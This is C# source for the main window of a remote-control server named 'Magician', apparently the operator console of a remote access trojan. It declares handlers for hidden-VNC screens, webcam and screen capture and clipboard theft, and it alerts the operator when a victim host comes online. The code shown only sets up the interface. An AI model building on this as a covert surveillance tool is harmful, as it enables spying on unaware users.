using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using RemoteControl.Protocals;
using System.IO;
using System.Threading;
using System.Diagnostics;
using log4net;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using RemoteControl.Protocals.Utilities;
using RemoteControl.Protocals.Relay;
using RemoteControl.Server.Utils;

namespace RemoteControl.Server
{
    public partial class FrmMain : FrmBase
    {
        public const string APP_TITLE = "\u9b54\u6cd5\u5e08";
        private static readonly ILog Logger = LogManager.GetLogger(typeof(FrmMain));
        private int clientCount = 0;
        private TreeNode InternetTreeNode
        {
            get
            {
                if (this.treeView1 == null)
                    return null;
                while (this.treeView1.Nodes.Count <= 1)
                {
                    this.treeView1.Nodes.Add("自动上线主机");
                }
                return this.treeView1.Nodes[1];
            }
        }
        private SocketSession currentSession = null;
        private readonly List<SocketSession> onlineClientSessions = new List<SocketSession>();
        private string hostFilterKeyword = "";
        private Dictionary<string, Action<ResponseStartGetScreen>> sessionScreenHandlers = new Dictionary<string, Action<ResponseStartGetScreen>>();
        private Dictionary<string, Action<ResponseStartCaptureVideo>> sessionVideoHandlers = new Dictionary<string, Action<ResponseStartCaptureVideo>>();
        private Dictionary<string, Action<ResponseHVNCScreen>> sessionHVNCScreenHandlers = new Dictionary<string, Action<ResponseHVNCScreen>>();
        private Dictionary<string, Action<ResponseHVNCStart>> sessionHVNCStartHandlers = new Dictionary<string, Action<ResponseHVNCStart>>();
        private Dictionary<string, Action<ResponseClipboardGet>> sessionHVNCClipboardHandlers = new Dictionary<string, Action<ResponseClipboardGet>>();
        private SendCommandHotKey sendCommandHotKey = SendCommandHotKey.Enter;
        private WaveOut _waveOut = null;
        private Panel topNavigationPanel;
        private Label topRelayStatusLabel;
        private Label topClientInfoLabel;
        private Button topRelayButton;
        private NotifyIcon onlineNotifyIcon;

        public FrmMain()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.Text = APP_TITLE;
            this.WindowState = FormWindowState.Normal;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.ShowInTaskbar = true;
            Control.CheckForIllegalCrossThreadCalls = false;
            initClientContextMenu();
            initFileManagerContextMenu();
            initSkinMenus();
            initIcons();
            initServerEvents();
            InitializeOnlineNotifyIcon();
            BuildTopNavigationUI();
            InitializeHostDashboardLayout();
            AutoConnectRelay();
            UIUtil.BindTextBoxCtrlA(this.textBoxCommandRequest);
            UIUtil.BindTextBoxCtrlA(this.textBoxCommandResponse);
            actChangeSkin(Settings.CurrentSettings.SkinPath);
            if (WaveOut.Devices.Length > 0)
            {
                _waveOut = new WaveOut(WaveOut.Devices[0], 8000, 16, 1);
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (MsgBox.Question("确定要退出远程控制程序?", MessageBoxButtons.OKCancel) == DialogResult.Cancel)
            {
                e.Cancel = true;
                return;
            }

            if (onlineNotifyIcon != null)
            {
                onlineNotifyIcon.Visible = false;
                onlineNotifyIcon.Dispose();
                onlineNotifyIcon = null;
            }
        }

        private void InitializeOnlineNotifyIcon()
        {
            if (onlineNotifyIcon != null)
                return;

            onlineNotifyIcon = new NotifyIcon();
            onlineNotifyIcon.Icon = this.Icon == null ? SystemIcons.Information : this.Icon;
            onlineNotifyIcon.Text = APP_TITLE;
            onlineNotifyIcon.Visible = true;
        }

        private void ShowClientOnlineNotification(SocketSession session)
        {
            if (session == null)
                return;

            try
            {
                InitializeOnlineNotifyIcon();
                onlineNotifyIcon.ShowBalloonTip(
                    3000,
                    "主机上线",
                    GetClientDisplayText(session) + " 已上线",
                    ToolTipIcon.Info);
            }
            catch
            {
            }
        }
    }
}
